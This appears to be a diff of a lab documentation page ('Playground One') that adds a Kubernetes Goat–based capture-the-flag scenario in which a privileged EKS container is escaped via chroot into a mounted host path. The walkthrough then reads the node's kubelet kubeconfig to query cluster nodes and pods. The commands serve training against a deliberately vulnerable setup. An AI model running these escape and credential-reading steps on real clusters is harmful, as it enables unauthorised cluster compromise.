@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../container-security-eks-runtime-violations/">
+        <link rel="prev" href="../xdr-for-containers-ecs-struts/">
       
       
-        <link rel="next" href="../container-security-eks-privileged-shell/">
+        <link rel="next" href="../sentry/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.5.1, mkdocs-material-9.1.21">
     
     
       
-        <title>Escape to Node - Playground One</title>
+        <title>Escape to Host System - Playground One</title>
       
     
     
@@ -73,7 +73,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#scenario-vision-one-container-security-escape-to-node" class="md-skip">
+        <a href="#scenario-escape-to-the-host-system" class="md-skip">
           Skip to content
         </a>
       
@@ -108,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Escape to Node
+              Escape to Host System
             
           </span>
         </div>
@@ -574,34 +574,6 @@
               
   
   
-  
-    <li class="md-nav__item">
-      <a href="../container-security-eks-runtime-vulnerability/" class="md-nav__link">
-        Runtime Vulnerability Scan
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../container-security-eks-runtime-violations/" class="md-nav__link">
-        Runtime Violations
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
     
   
   
@@ -614,12 +586,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          Escape to Node
+          Escape to Host System
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        Escape to Node
+        Escape to Host System
       </a>
       
         
@@ -645,16 +617,44 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#exploiting" class="md-nav__link">
-    Exploiting
+  <a href="#attribution" class="md-nav__link">
+    Attribution
   </a>
   
-    <nav class="md-nav" aria-label="Exploiting">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#disclaimer" class="md-nav__link">
+    Disclaimer
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    Overview
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-story" class="md-nav__link">
+    The story
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#goals" class="md-nav__link">
+    Goals
+  </a>
+  
+    <nav class="md-nav" aria-label="Goals">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
+  <a href="#hints" class="md-nav__link">
+    Hints
   </a>
   
 </li>
@@ -664,24 +664,17 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#solution-walkthrough" class="md-nav__link">
+    Solution &amp; Walkthrough
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
       
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../container-security-eks-privileged-shell/" class="md-nav__link">
-        Privileged Shell
-      </a>
     </li>
   
 
@@ -782,22 +775,57 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#exploiting" class="md-nav__link">
-    Exploiting
+  <a href="#attribution" class="md-nav__link">
+    Attribution
   </a>
   
-    <nav class="md-nav" aria-label="Exploiting">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#disclaimer" class="md-nav__link">
+    Disclaimer
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    Overview
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-story" class="md-nav__link">
+    The story
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#goals" class="md-nav__link">
+    Goals
+  </a>
+  
+    <nav class="md-nav" aria-label="Goals">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
+  <a href="#hints" class="md-nav__link">
+    Hints
   </a>
   
 </li>
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution-walkthrough" class="md-nav__link">
+    Solution &amp; Walkthrough
+  </a>
   
 </li>
       
@@ -816,15 +844,161 @@
                   
 
 
-<h1 id="scenario-vision-one-container-security-escape-to-node">Scenario: Vision One Container Security Escape to Node<a class="headerlink" href="#scenario-vision-one-container-security-escape-to-node" title="Permanent link">&para;</a></h1>
+<h1 id="scenario-escape-to-the-host-system">Scenario: Escape to the Host System<a class="headerlink" href="#scenario-escape-to-the-host-system" title="Permanent link">&para;</a></h1>
 <h2 id="prerequisites">Prerequisites<a class="headerlink" href="#prerequisites" title="Permanent link">&para;</a></h2>
 <ul>
 <li>Vision One Container Security</li>
 <li>Playground One EKS Cluster</li>
-<li>Running app: </li>
+<li>Running app: System Monitor</li>
 </ul>
-<h2 id="exploiting">Exploiting<a class="headerlink" href="#exploiting" title="Permanent link">&para;</a></h2>
-<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<h2 id="attribution">Attribution<a class="headerlink" href="#attribution" title="Permanent link">&para;</a></h2>
+<p>This scenario is based on <a href="https://madhuakula.com/kubernetes-goat/docs/">Kubernetes Goat</a> but adapted to work an Playground One and EKS.</p>
+<h2 id="disclaimer">Disclaimer<a class="headerlink" href="#disclaimer" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong><em>Note:</em></strong> It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>
+</blockquote>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p>This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.</p>
+<p>By the end of the scenario, you will understand and learn the following:</p>
+<ul>
+<li>Able to exploit the container and escape out of the docker container</li>
+<li>You will learn to test and exploit the misconfigured and privileged containers</li>
+<li>Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments</li>
+</ul>
+<h2 id="the-story">The story<a class="headerlink" href="#the-story" title="Permanent link">&para;</a></h2>
+<p>Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.</p>
+<blockquote>
+<p><strong><em>Note:</em></strong> To get started with the scenario, navigate to http://<loadbalancer_dns_system_monitor></p>
+</blockquote>
+<h2 id="goals">Goals<a class="headerlink" href="#goals" title="Permanent link">&para;</a></h2>
+<p>The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.</p>
+<blockquote>
+<p><strong><em>Tip:</em></strong> Gain access to the host system and obtain the node level kubeconfig file /var/lib/kubelet/kubeconfig, and query the Kubernetes nodes using the obtained configuration.</p>
+</blockquote>
+<h3 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">&para;</a></h3>
+<details>
+<summary>Click here</summary>
+
+*✨ Are you still in the container?*
+
+See the mounted file systems, also look the capabilities available for the container using capsh 🙌
+
+*✨ Escaped container?*
+
+You can recon the system, some interesting places to obtain the node level configuration are /var/lib/kubelet/kubeconfig and I hope you know how to query Kubernetes API for nodes? 🎉
+</details>
+
+<h2 id="solution-walkthrough">Solution &amp; Walkthrough<a class="headerlink" href="#solution-walkthrough" title="Permanent link">&para;</a></h2>
+<details>
+<summary>Click here</summary>
+After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as /host-system is mounted.
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>capsh<span class="w"> </span>--print
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span>mount
+</code></pre></div>
+
+Now you can explore the mounted file system by navigating to the /host-system path
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>ls<span class="w"> </span>/host-system/
+</code></pre></div>
+
+You can gain access to the host system privileges using chroot
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>chroot<span class="w"> </span>/host-system<span class="w"> </span>bash
+</code></pre></div>
+
+As you can see, now you can access all the host system resources like docker containers, configurations, etc.
+
+Trying to use the docker client fails.
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>docker<span class="w"> </span>ps
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>bash: docker: command not found
+</code></pre></div>
+
+This does not work, since we're on a Kubernetes optimized node OS with no docker provided.
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$<span class="w"> </span>uname<span class="w"> </span>-a
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre></div>
+
+The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>$<span class="w"> </span>cat<span class="w"> </span>/var/lib/kubelet/kubeconfig
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>apiVersion: v1
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>kind: Config
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>clusters:
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>- cluster:
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>    certificate-authority: /etc/kubernetes/pki/ca.crt
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>  name: kubernetes
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>contexts:
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>- context:
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    cluster: kubernetes
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    user: kubelet
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>  name: kubelet
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>current-context: kubelet
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>users:
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>- name: kubelet
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>  user:
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>    exec:
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>      apiVersion: client.authentication.k8s.io/v1beta1
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>      command: /usr/bin/aws-iam-authenticator
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>      args:
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>        - &quot;token&quot;
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>        - &quot;-i&quot;
+<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>        - &quot;playground-one-eks&quot;
+<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>        - --region
+<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>        - &quot;eu-central-1&quot;
+</code></pre></div>
+
+Sadly, there is no `kubectl` as well.
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>$<span class="w"> </span>kubectl
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>bash: kubectl: command not found
+</code></pre></div>
+
+Trying to use the package manager `yum` will not solve the problem. But navigating to <https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux> will help:
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$<span class="w"> </span><span class="nb">cd</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>$<span class="w"> </span>curl<span class="w"> </span>-LO<span class="w"> </span><span class="s2">&quot;https://dl.k8s.io/release/</span><span class="k">$(</span>curl<span class="w"> </span>-L<span class="w"> </span>-s<span class="w"> </span>https://dl.k8s.io/release/stable.txt<span class="k">)</span><span class="s2">/bin/linux/amd64/kubectl&quot;</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>kubectl
+</code></pre></div>
+
+Try to get the available nodes of our cluster:
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>NAME                                            STATUS   ROLES    AGE   VERSION
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>ip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad
+</code></pre></div>
+
+Can you do more?
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>pods<span class="w"> </span>-A
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
+</code></pre></div>
+
+```ascii
+NAME                                            STATUS   ROLES    AGE   VERSION
+ip-10-0-152-251.eu-central-1.compute.internal   Ready    <none>   76m   v1.25.11-eks-a5565ad
+ip-10-0-169-117.eu-central-1.compute.internal   Ready    <none>   76m   v1.25.11-eks-a5565ad
+````
+
+</details>
 
 
 
